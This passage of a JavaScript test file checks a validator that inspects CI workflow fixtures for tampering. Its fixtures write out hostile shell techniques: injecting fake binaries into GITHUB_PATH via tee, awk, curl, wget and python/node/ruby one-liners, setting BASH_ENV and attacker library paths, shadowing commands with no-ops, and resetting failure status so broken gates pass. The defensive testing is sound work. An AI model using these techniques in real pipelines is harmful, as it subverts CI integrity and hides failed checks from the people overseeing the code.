    reassignedRuntimeLib.splice(runtimeLibDefinitionIndex + 1, 0, 'runtime_lib=/tmp/attacker-libs');
    writeWorkflowFixture(root, nativePostgresWorkflow(reassignedRuntimeLib));
    const reassignedRuntimeLibResult = validateSkipPolicy({ root });
    expect(reassignedRuntimeLibResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    const reassignedRuntimeLibAfterExport = [...validNativePostgresSetupAndExport];
    reassignedRuntimeLibAfterExport.splice(nativeEnvironmentExportEnd + 1, 0, 'runtime_lib=/tmp/attacker-libs');
    writeWorkflowFixture(root, nativePostgresWorkflow(reassignedRuntimeLibAfterExport));
    const reassignedRuntimeLibAfterExportResult = validateSkipPolicy({ root });
    expect(reassignedRuntimeLibAfterExportResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );

    writeWorkflowFixture(root, procEnvironmentWorkflow(['printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | tee -a "${path_file}"']));
    const procEnvironmentTeeResult = validateSkipPolicy({ root });
    expect(procEnvironmentTeeResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(procEnvironmentTeeResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(procEnvironmentTeeResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Write a fake node through a negated find command',
      '        run: |',
      '          mkdir -p fakebin',
      "          printf '%s\\n' '#!/bin/sh' 'exit 0' > fakebin/node",
      '          chmod +x fakebin/node',
      "          printf '%s\\n' \"${GITHUB_WORKSPACE}/fakebin\" > fakebin/path-entry",
      "          ! find \"${RUNNER_TEMP}/_runner_file_commands\" -type f -name 'add_path_*' -exec tee -a {} \\; < fakebin/path-entry",
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => '          ' + line),
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const negatedFindWriterResult = validateSkipPolicy({ root });
    expect(negatedFindWriterResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(negatedFindWriterResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(negatedFindWriterResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    for (const awkCommand of ['awk', 'mawk', 'gawk', 'nawk', 'oawk', 'original-awk']) {
      writeWorkflowFixture(root, procEnvironmentWorkflow([
        `${awkCommand} -v dst="\${path_file}" -v dir="\${RUNNER_TEMP}/fakebin" 'BEGIN { print dir >> dst }'`
      ]));
      const procEnvironmentAwkResult = validateSkipPolicy({ root });
      expect(procEnvironmentAwkResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(procEnvironmentAwkResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(procEnvironmentAwkResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    writeWorkflowFixture(root, procEnvironmentWorkflow([
      'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" > "${RUNNER_TEMP}/path-entry"',
      'cp "${RUNNER_TEMP}/path-entry" "${path_file}"'
    ]));
    const procEnvironmentCopyResult = validateSkipPolicy({ root });
    expect(procEnvironmentCopyResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(procEnvironmentCopyResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(procEnvironmentCopyResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    for (const fileCopyCommand of [
      'curl --silent --output "${path_file}" "file://${RUNNER_TEMP}/path-entry"',
      'wget --output-document "${path_file}" "file://${RUNNER_TEMP}/path-entry"',
      'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | sort -o "${path_file}"',
      'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" | iconv -f UTF-8 -t UTF-8 --output="${path_file}"'
    ]) {
      writeWorkflowFixture(root, procEnvironmentWorkflow([
        'printf \'%s\\n\' "${RUNNER_TEMP}/fakebin" > "${RUNNER_TEMP}/path-entry"',
        fileCopyCommand
      ]));
      const fileCopyResult = validateSkipPolicy({ root });
      expect(fileCopyResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(fileCopyResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(fileCopyResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    for (const inlineCodeCommand of [
      `python3 -c 'import os; open(os.environ["GITHUB_"+"PATH"], "a").write("/tmp/fakebin\\n")'`,
      `node --eval 'require("fs").appendFileSync(process.env["GITHUB_"+"ENV"], "BASH_ENV=/tmp/startup\\n")'`,
      `ruby -e 'File.open(ENV["GITHUB_"+"PATH"], "a") { |file| file.puts("/tmp/fakebin") }'`,
      `bash -c 'echo /tmp/fakebin >> "$GITHUB_PATH"'`
    ]) {
      writeWorkflowFixture(root, procEnvironmentWorkflow([inlineCodeCommand]));
      const inlineCodeResult = validateSkipPolicy({ root });
      expect(inlineCodeResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(inlineCodeResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(inlineCodeResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Persist PATH override through GITHUB_ENV',
      '        run: echo "PATH=/tmp/fakebin:${PATH}" >> "${GITHUB_ENV}"',
      '      - name: Required Redis and Vitest gates',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`),
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const githubEnvPathResult = validateSkipPolicy({ root });
    expect(githubEnvPathResult.errors).toContain(
      'fixture CI job sets an unsafe shell startup or command-resolution environment'
    );
    expect(githubEnvPathResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(githubEnvPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    for (const scope of ['workflow', 'job', 'step']) {
      const workflowEnv = scope === 'workflow' ? ['env:', '  PATH: /tmp/fakebin'] : [];
      const jobEnv = scope === 'job' ? ['    env:', '      PATH: /tmp/fakebin'] : [];
      const stepEnv = scope === 'step' ? ['        env:', '          PATH: /tmp/fakebin'] : [];
      writeWorkflowFixture(root, [
        ...workflowEnv,
        'jobs:',
        '  critical:',
        ...jobEnv,
        '    steps:',
        '      - name: Required Redis and Vitest gates',
        ...stepEnv,
        '        run: |',
        ...validRedisSetupAndExport.map((line) => `          ${line}`),
        '          overall_status=0',
        ...validVitestHelper.map((line) => `          ${line}`),
        '          run_vitest_shard vitest-integration',
        '          exit "${overall_status}"'
      ]);
      const explicitPathResult = validateSkipPolicy({ root });
      expect(explicitPathResult.errors).toContain(
        'fixture CI job sets an unsafe shell startup or command-resolution environment'
      );
      expect(explicitPathResult.errors).toContain(
        'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
      );
      expect(explicitPathResult.errors).toContain(
        'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
      );
    }

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Branch-controlled export decoy',
      '        run: |',
      '          if false; then',
      '            {',
      '              echo "REDIS_SERVER_BIN=${redis_server}"',
      '            } >> "${GITHUB_ENV}"',
      '          fi'
    ]);
    const branchResult = validateSkipPolicy({ root });
    expect(branchResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    if: false',
      '    steps:',
      '      - name: Disabled job command',
      '        run: pnpm run job-disabled-fixture'
    ]);
    const jobConditionResult = validateSkipPolicy({ root });
    expect(jobConditionResult.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run job-disabled-fixture'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    continue-on-error: true',
      '    steps:',
      '      - name: Export in continue-on-error job',
      '        run: |',
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"'
    ]);
    const jobContinueResult = validateSkipPolicy({ root });
    expect(jobContinueResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Valid helper definition and aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const validHelperResult = validateSkipPolicy({ root });
    expect(validHelperResult.errors).not.toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Helper fixes the wrong shard argument',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line === '  local shard="$1"' ? '  local shard="vitest-unit"' : line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const wrongShardResult = validateSkipPolicy({ root });
    expect(wrongShardResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Aggregate exit after unreachable early exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit 0',
      '          exit "${overall_status}"'
    ]);
    const unreachableAggregateResult = validateSkipPolicy({ root });
    expect(unreachableAggregateResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          overall_status=0',
      '          exit "${overall_status}"'
    ]);
    const resetStatusResult = validateSkipPolicy({ root });
    expect(resetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Declared failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          declare -g overall_status=0',
      '          exit "${overall_status}"'
    ]);
    const declaredResetStatusResult = validateSkipPolicy({ root });
    expect(declaredResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Nameref failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          declare -n status_alias=overall_status',
      '          status_alias=0',
      '          exit "${overall_status}"'
    ]);
    const namerefResetStatusResult = validateSkipPolicy({ root });
    expect(namerefResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Continued nameref failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          declare \\',
      '            -n status_alias=overall_status',
      '          status_alias=0',
      '          exit "$' + '{overall_status}"'
    ]);
    const continuedNamerefResetStatusResult = validateSkipPolicy({ root });
    expect(continuedNamerefResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Grouped nameref failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          { declare -n status_alias=overall_status; status_alias=0; }',
      '          exit "${overall_status}"'
    ]);
    const groupedNamerefResetStatusResult = validateSkipPolicy({ root });
    expect(groupedNamerefResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Case-arm nameref failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          case x in x) declare -n status_alias=overall_status; status_alias=0;; esac',
      '          exit "${overall_status}"'
    ]);
    const caseNamerefResetStatusResult = validateSkipPolicy({ root });
    expect(caseNamerefResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Nested helper failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          reset_status() { overall_status=0; }',
      '          reset_wrapper() { reset_status; }',
      '          run_vitest_shard vitest-integration',
      '          reset_wrapper',
      '          exit "${overall_status}"'
    ]);
    const nestedResetStatusResult = validateSkipPolicy({ root });
    expect(nestedResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    const helperWithNestedStatusReset = validVitestHelper.flatMap((line) =>
      line === '}' ? ['  reset_wrapper', line] : [line]
    );
    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Shard helper calls an aggregate status resetter',
      '        run: |',
      '          overall_status=0',
      '          reset_status() { overall_status=0; }',
      '          reset_wrapper() { reset_status; }',
      ...helperWithNestedStatusReset.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const helperCalledResetStatusResult = validateSkipPolicy({ root });
    expect(helperCalledResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Earlier reset helper redefined after its call',
      '        run: |',
      '          overall_status=0',
      '          reset_status() { overall_status=0; }',
      ...validVitestHelper.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          reset_status',
      '          reset_status() { :; }',
      '          exit "${overall_status}"'
    ]);
    const redefinedResetStatusResult = validateSkipPolicy({ root });
    expect(redefinedResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Dynamic printf failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          status_name=overall_status',
      '          printf -v "$status_name" %s 0',
      '          exit "${overall_status}"'
    ]);
    const dynamicPrintfResetStatusResult = validateSkipPolicy({ root });
    expect(dynamicPrintfResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Loop binding failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          for overall_status in 0; do :; done',
      '          exit "${overall_status}"'
    ]);
    const loopBindingResetStatusResult = validateSkipPolicy({ root });
    expect(loopBindingResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Compound assignment failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          { overall_status=0; }; if true; then overall_status=0; fi',
      '          exit "${overall_status}"'
    ]);
    const compoundResetStatusResult = validateSkipPolicy({ root });
    expect(compoundResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Continued failure status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          :; \\',
      '          overall_status=0',
      '          exit "${overall_status}"'
    ]);
    const continuedResetStatusResult = validateSkipPolicy({ root });
    expect(continuedResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Multiline quoted status reset before aggregate exit',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          printf x "ignored',
      '          "; overall_status=0',
      '          exit "${overall_status}"'
    ]);
    const multilineQuotedResetStatusResult = validateSkipPolicy({ root });
    expect(multilineQuotedResetStatusResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: PATH overridden before shard helper',
      '        run: |',
      '          overall_status=0',
      '          PATH=/tmp/fakebin:$PATH',
      ...validVitestHelper.map((line) => '          ' + line),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const pathOverrideShardResult = validateSkipPolicy({ root });
    expect(pathOverrideShardResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    const helperWithQuotedStatusReset = validVitestHelper.flatMap((line) =>
      line.trim() === 'overall_status=1'
        ? [line, '      read -r "overall_status" <<<0']
        : [line]
    );
    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Quoted failure status reset in shard helper',
      '        run: |',
      '          overall_status=0',
      ...helperWithQuotedStatusReset.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const quotedStatusResetResult = validateSkipPolicy({ root });
    expect(quotedStatusResetResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    const helperWithQuotedShardMutation = validVitestHelper.flatMap((line) =>
      line.trim() === 'local shard="$1"'
        ? [line, '  read -r "shard" <<<other-shard']
        : [line]
    );
    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Quoted shard mutation before runner call',
      '        run: |',
      '          overall_status=0',
      ...helperWithQuotedShardMutation.map((line) => `          ${line}`),
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const quotedShardMutationResult = validateSkipPolicy({ root });
    expect(quotedShardMutationResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Node command hash points to a no-op',
      '        run: |',
      '          overall_status=0',
      ...validVitestHelper.map((line) => '          ' + line),
      '          hash -p /bin/true node',
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"'
    ]);
    const hashedNodeOverrideResult = validateSkipPolicy({ root });
    expect(hashedNodeOverrideResult.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Valid Redis executable and export',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`)
    ]);
    const validRedisResult = validateSkipPolicy({ root });
    expect(validRedisResult.errors).not.toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: PATH and disabled builtins spoof Redis validation and export',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, 3).map((line) => '          ' + line),
      '          PATH=/tmp/fakebin:$PATH',
      '          enable -n test',
      '          enable -n echo',
      ...validRedisSetupAndExport.slice(3).map((line) => '          ' + line)
    ]);
    const commandResolutionRedisResult = validateSkipPolicy({ root });
    expect(commandResolutionRedisResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed after validation',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => `          ${line}`),
      '          declare -g redis_server=/bin/true',
      ...validRedisSetupAndExport.slice(-3).map((line) => `          ${line}`)
    ]);
    const changedRedisPathResult = validateSkipPolicy({ root });
    expect(changedRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through nameref',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => `          ${line}`),
      '          if declare -n server_alias=redis_server; then :; fi',
      '          server_alias=/bin/true',
      ...validRedisSetupAndExport.slice(-3).map((line) => `          ${line}`)
    ]);
    const namerefRedisPathResult = validateSkipPolicy({ root });
    expect(namerefRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through continued nameref',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          declare \\',
      '            -n server_alias=redis_server',
      '          server_alias=/bin/true',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const continuedNamerefRedisPathResult = validateSkipPolicy({ root });
    expect(continuedNamerefRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through grouped nameref',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          { declare -n server_alias=redis_server; server_alias=/bin/true; }',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const groupedNamerefRedisPathResult = validateSkipPolicy({ root });
    expect(groupedNamerefRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through case-arm nameref',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          case x in x) declare -n server_alias=redis_server; server_alias=/bin/true;; esac',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const caseNamerefRedisPathResult = validateSkipPolicy({ root });
    expect(caseNamerefRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through dynamic printf target',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          path_name=redis_server',
      '          printf -v "$path_name" %s /bin/true',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const dynamicPrintfRedisPathResult = validateSkipPolicy({ root });
    expect(dynamicPrintfRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through loop binding',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          for redis_server in /bin/true; do :; done',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const loopBindingRedisPathResult = validateSkipPolicy({ root });
    expect(loopBindingRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through compound assignments',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          { redis_server=/bin/true; }; if true; then redis_server=/bin/true; fi',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const compoundRedisPathResult = validateSkipPolicy({ root });
    expect(compoundRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed through continued assignment',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          :; \\',
      '          redis_server=/bin/true',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const continuedRedisPathResult = validateSkipPolicy({ root });
    expect(continuedRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed after a multiline quoted string',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => '          ' + line),
      '          printf x "ignored',
      '          "; redis_server=/bin/true',
      ...validRedisSetupAndExport.slice(-3).map((line) => '          ' + line)
    ]);
    const multilineQuotedRedisPathResult = validateSkipPolicy({ root });
    expect(multilineQuotedRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis path changed by function',
      '        run: |',
      '          set -euo pipefail',
      '          runtime_root="/tmp/runtime"',
      '          redis_server="${runtime_root}/usr/bin/redis-server"',
      '          replace_redis_path() { redis_server=/bin/true; }',
      '          test -x "${redis_server}"',
      '          replace_redis_path',
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"'
    ]);
    const functionChangedRedisPathResult = validateSkipPolicy({ root });
    expect(functionChangedRedisPathResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis executable test shadowed',
      '        run: |',
      '          set -euo pipefail',
      '          runtime_root="/tmp/runtime"',
      '          redis_server="${runtime_root}/usr/bin/redis-server"',
      '          test() { :; }',
      '          test -x "${redis_server}"',
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"'
    ]);
    const shadowedTestResult = validateSkipPolicy({ root });
    expect(shadowedTestResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis export with redirected environment target',
      '        run: |',
      ...validRedisSetupAndExport.slice(0, -3).map((line) => `          ${line}`),
      '          GITHUB_ENV=/tmp/not-runner-environment',
      ...validRedisSetupAndExport.slice(-3).map((line) => `          ${line}`)
    ]);
    const overriddenGithubEnvResult = validateSkipPolicy({ root });
    expect(overriddenGithubEnvResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );

    writeWorkflowFixture(root, [
      'env:',
      '  GITHUB_ENV: /tmp/not-runner-environment',
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Redis export with workflow-level redirected environment target',
      '        run: |',
      ...validRedisSetupAndExport.map((line) => `          ${line}`)
    ]);
    const workflowGithubEnvResult = validateSkipPolicy({ root });
    expect(workflowGithubEnvResult.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('allowlist entries bind the skip kind, condition and exact occurrence count', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      "test('conditional', { skip: process.env.REQUIRED_FIXTURE }, () => {});\n"
    );

    const result = validateSkipAllowlist({
      root,
      policy: {
        schemaVersion: 1,
        unapprovedSkipAction: 'fail',
        allowlist: [
          {
            path: 'fixture.test.mjs',
            kind: 'option',
            condition: 'process.env.REQUIRED_FIXTURE',
            count: 1,
            shard: 'fixture'
          }
        ]
      }
    });

    expect(result.errors).toEqual([]);
    expect(JSON.parse(readFileSync(join(repositoryRoot, 'docs/engineering/test-skip-policy.json'), 'utf8')).unapprovedSkipAction).toBe('fail');
  } finally {
